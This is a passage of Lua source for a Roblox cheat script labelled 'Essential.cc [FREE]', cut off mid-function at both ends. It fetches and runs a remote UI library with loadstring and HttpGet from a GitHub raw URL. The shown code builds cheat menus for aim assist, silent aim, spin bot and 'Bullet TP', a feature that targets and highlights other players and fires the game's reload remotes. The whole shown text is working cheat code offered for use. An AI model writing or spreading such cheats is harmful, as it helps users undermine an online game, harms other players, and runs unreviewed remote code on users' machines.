        if Settings.TargetStrafe and Locked and Victim then
            StartStrafe()
        else
            StopStrafe()
        end
    end
end)


player.CharacterAdded:Connect(function()
    task.wait(1)
    if Settings.DesyncEnabled then
        StopDesync()
    end
    if Settings.ForcefieldEnabled then
        task.wait(0.5)
        CreateForcefield()
    end
    if Settings.AimAssist then
        CreateOrUpdateLockButton()
        if LockButton then
            LockButton.Image = Locked and "rbxassetid://96734356722259" or "rbxassetid://88399410034249"
        end
    end
end)


local repo = "https://raw.githubusercontent.com/mstudio45/LinoriaLib/main/"
local Library, ThemeManager, SaveManager

pcall(function()
    Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
    ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
    SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
end)

if not Library then
    warn("Failed to load LinoriaLib!")
    return
end

Library.ShowToggleFrameInKeybinds = true
Library.ShowCustomCursor = true

local Window = Library:CreateWindow({
    Title = "Essential.cc [FREE]",
    Center = true,
    AutoShow = true,
    Resizable = true,
    TabPadding = 6,
    MenuFadeTime = 0.2,
    Size = UDim2.new(0, 520, 0, 360)
})

local Tabs = {
    Main = Window:AddTab("Main"),
    Visual = Window:AddTab("Visual"),
    Configuration = Window:AddTab("Configuration"),
}


local AimGroup = Tabs.Main:AddLeftGroupbox("Aim Assist")

AimGroup:AddToggle("Notifications", {
    Text = "Notifications",
    Default = false,
    Callback = function(Value)
        Settings.Notifications = Value
    end
})

AimGroup:AddToggle("EnableAimAssist", {
    Text = "Enable Aim assist",
    Default = false,
    Callback = function(Value)
        Settings.AimAssist = Value
        
        if Value then
            CreateOrUpdateLockButton()
        else
            if ScreenGui then
                ScreenGui:Destroy()
                ScreenGui = nil
                LockButtonFrame = nil
                LockButton = nil
            end
            if Locked then
                ToggleLock()
            end
        end
    end
})

AimGroup:AddToggle("EnableLookAt", {
    Text = "Enable Look At",
    Default = false,
    Callback = function(Value)
        Settings.LookAt = Value
        if Settings.Notifications then
            NotificationSystem:Notify("Look At: " .. (Value and "ON" or "OFF"), 2)
        end
    end
})

AimGroup:AddToggle("EnableTargetAim", {
    Text = "Enable Target Aim",
    Default = false,
    Callback = function(Value)
        Settings.TargetAim = Value
        if Locked then
            getgenv().SilentAim.Enabled = Value
        end
    end
})

AimGroup:AddDropdown("TargetAimMethod", {
    Values = {"FireServer", "Raycast"},
    Default = 1,
    Text = "Select Target Aim Method",
    Callback = function(Value)
        Settings.NamecallMode = Value
    end
})

local AirGroup = Tabs.Main:AddLeftGroupbox("Air Settings")

AirGroup:AddToggle("AutoAir", {
    Text = "Auto Air",
    Default = false,
    Callback = function(Value)
        Settings.AutoAir = Value
        if Value and Settings.Notifications then
            NotificationSystem:Notify("Auto Air: Enabled", 2)
        end
    end
})

AirGroup:AddInput("AirOffsetInput", {
    Default = "0.1",
    Numeric = true,
    Finished = true,
    Text = "Air Delay",
    Placeholder = "0.1",
    
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            if num < 0.1 then
                num = 0.1
                Settings.AirOffset = "0.1"
                if Settings.Notifications then
                    NotificationSystem:Notify("Air Delay set to minimum: 0.1", 2)
                end
            else
                Settings.AirOffset = tostring(num)
                if Settings.Notifications then
                    NotificationSystem:Notify("Air Delay: " .. num .. "s", 2)
                end
            end
        else
            Settings.AirOffset = "0.1"
            if Settings.Notifications then
                NotificationSystem:Notify("Invalid input! Set to default: 0.1", 2)
            end
        end
    end
})

local SpinBotGroup = Tabs.Main:AddLeftGroupbox("Spin Bot")

SpinBotGroup:AddToggle("EnableSpinBot", {
    Text = "Enable Spin Bot",
    Default = false,
    Callback = function(Value)
        Settings.SpinBotEnabled = Value
        if Settings.Notifications then
            NotificationSystem:Notify("Spin Bot: " .. (Value and "ON" or "OFF"), 2)
        end
    end
})

SpinBotGroup:AddSlider("SpinBotSpeed", {
    Text = "Speed",
    Default = 50,
    Min = 1,
    Max = 100,
    Rounding = 0,
    Callback = function(Value)
        Settings.SpinBotSpeed = Value
    end
})

local BulletTPGroup = Tabs.Main:AddLeftGroupbox("Bullet Tp")

local function GetPlayerList()
    local playerNames = {"Closest"}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player then
            table.insert(playerNames, plr.Name)
        end
    end
    return playerNames
end

BulletTPDropdown = BulletTPGroup:AddDropdown("BulletTPPlayerDropdown", {
    Values = GetPlayerList(),
    Default = 1,
    Text = "Select Target",
    Callback = function(Value)
        if Value == "Closest" then
            Settings.BulletTPMode = "Closest"
            Settings.BulletTPPlayer = nil
        else
            Settings.BulletTPMode = "Selected"
            Settings.BulletTPPlayer = Players:FindFirstChild(Value)
        end
    end
})

task.spawn(function()
    while true do
        task.wait(2)
        if BulletTPDropdown then
            local currentList = GetPlayerList()
            BulletTPDropdown:SetValues(currentList)
        end
    end
end)

BulletTPGroup:AddToggle("EnableBulletTP", {
    Text = "Enable Bullet TP",
    Default = false,
    Callback = function(Value)
        if Value then
            if BulletTPActive then return end
            BulletTPActive = true
            
            BulletTPGui = Instance.new("ScreenGui")
            BulletTPGui.Name = "Gui"
            BulletTPGui.Parent = game.CoreGui
            BulletTPGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            local _Frame = Instance.new("Frame")
            _Frame.Size = UDim2.new(0, 80, 0, 35)
            _Frame.Position = UDim2.new(0.1, 0, 0.2, 0)
            _Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            _Frame.BorderSizePixel = 0
            _Frame.Active = true
            _Frame.BackgroundTransparency = 0.5
            _Frame.Draggable = true
            _Frame.Parent = BulletTPGui

            local _TextButton = Instance.new("TextButton")
            _TextButton.Size = UDim2.new(0.9, 0, 0.8, 0)
            _TextButton.Position = UDim2.new(0.05, 0, 0.1, 0)
            _TextButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            _TextButton.BorderSizePixel = 0
            _TextButton.Text = "OFF"
            _TextButton.TextSize = 12
            _TextButton.TextColor3 = Color3.new(1, 1, 1)
            _TextButton.Font = Enum.Font.Code
            _TextButton.Parent = _Frame

            local _UICorner = Instance.new("UICorner")
            _UICorner.CornerRadius = UDim.new(0, 6)
            _UICorner.Parent = _Frame

            local _UICorner2 = Instance.new("UICorner")
            _UICorner2.CornerRadius = UDim.new(0, 6)
            _UICorner2.Parent = _TextButton

            local rs = game:GetService("RunService")
            local vim = game:GetService("VirtualInputManager")
            local mouse = player:GetMouse()

            local delay_btp = 0.2
            local key = Enum.KeyCode.R

            local data = {
                functions = {},
                connections = {},
                utility = { gun = {} }
            }

            _G.BulletTPEnabled = false
            _G.TargetPlayer = nil

            local cfg = {
                part = "Head",
                highlight_color = Color3.fromRGB(0,0,0),
                highlight_transparency = 0.5
            }

            local locked = nil
            local spec = false
            local hl = nil
            local tracer = nil

            local function press()
                vim:SendKeyEvent(true, key, false, game)
                task.wait(0.05)
                vim:SendKeyEvent(false, key, false, game)
            end

            local function tool()
                local char = player.Character
                if not char then return nil end
                for _,v in ipairs(char:GetChildren()) do
                    if v:IsA("Tool") then
                        return v
                    end
                end
                return nil
            end

            task.spawn(function()
                while BulletTPActive do
                    local t = tool()
                    if t then
                        local ammo = t:FindFirstChild("Ammo", true)
                        if ammo and ammo:IsA("ValueBase") then
                            if ammo.Value <= 0 then
                                local r = t:FindFirstChild("Reload", true) or t:FindFirstChild("ReloadFunction", true)
                                if r then
                                    pcall(function()
                                        r:FireServer()
                                    end)
                                else
                                    press()
                                end
                                task.wait(0.8)
                            end
                        end
                    end
                    task.wait(delay_btp)
                end
            end)

            local function highlight(t)
                if hl then
                    hl:Destroy()
                    hl = nil
                end
                if t and t.Character then
                    hl = Instance.new("Highlight")
                    hl.Name = "BTPHighlight"
                    hl.FillColor = cfg.highlight_color
                    hl.FillTransparency = cfg.highlight_transparency
                    hl.OutlineColor = Color3.new(0,0,0)
                    hl.OutlineTransparency = 0
                    hl.Adornee = t.Character
                    hl.Parent = game:GetService("CoreGui")
                end
            end

            local function getBulletTPTarget()
                if Settings.BulletTPMode == "Selected" and Settings.BulletTPPlayer then
                    if Settings.BulletTPPlayer.Character and Settings.BulletTPPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        return Settings.BulletTPPlayer
                    end
                end
                
                local dist = math.huge
                local target = nil
                for _,v in ipairs(Players:GetPlayers()) do
                    if v ~= player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                        local hrp = v.Character.HumanoidRootPart
                        local pos,on = Camera:WorldToViewportPoint(hrp.Position)
                        if on then
                            local mag = (Vector2.new(mouse.X,mouse.Y) - Vector2.new(pos.X,pos.Y)).Magnitude
                            if mag < dist then
                                dist = mag
                                target = v
                            end
                        end
                    end
                end
                return target
            end

            local function stopSpec()
                spec = false
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    Camera.CameraSubject = player.Character.Humanoid
                end
            end

            local function toggleLock()
                if locked then
                    locked = nil
                    _G.TargetPlayer = nil
                    _G.BulletTPEnabled = false
                    highlight(nil)
                    if tracer then tracer:Remove() tracer = nil end
                    stopSpec()
                    _TextButton.Text = "OFF"
                else
                    local t = getBulletTPTarget()
                    if t then
                        locked = t
                        _G.TargetPlayer = t
                        _G.BulletTPEnabled = true
                        highlight(t)
                        _TextButton.Text = "ON"
                        tracer = Drawing.new("Line")
                        tracer.Color = Color3.fromRGB(0,0,0)
                        tracer.Thickness = 1
                        tracer.Transparency = 0.5
                        
                        spec = true
                        if locked.Character and locked.Character:FindFirstChild("Humanoid") then
                            Camera.CameraSubject = locked.Character.Humanoid
                        end
                        
                        if Settings.Notifications then
                            NotificationSystem:Notify("Bullet TP: " .. t.Name, 2)
                        end
                    end
                end
            end

            _TextButton.MouseButton1Click:Connect(function()
                toggleLock()
            end)

            local btpInputBegan = UserInputService.InputBegan:Connect(function(i,g)
                if g then return end
                if i.KeyCode == Enum.KeyCode.C then
                    toggleLock()
                end
            end)

            local btpRenderStepped = rs.RenderStepped:Connect(function()
                if not BulletTPActive then return end
                if locked then
                    if Settings.BulletTPMode == "Selected" and Settings.BulletTPPlayer then
                        if not Settings.BulletTPPlayer.Parent or not Settings.BulletTPPlayer.Character then
                            locked = nil
                            _G.TargetPlayer = nil
                            _G.BulletTPEnabled = false
                            highlight(nil)
                            if tracer then tracer:Remove() tracer = nil end
                            stopSpec()
                            _TextButton.Text = "OFF"
                            return
                        end
                    end
                    
                    if not 
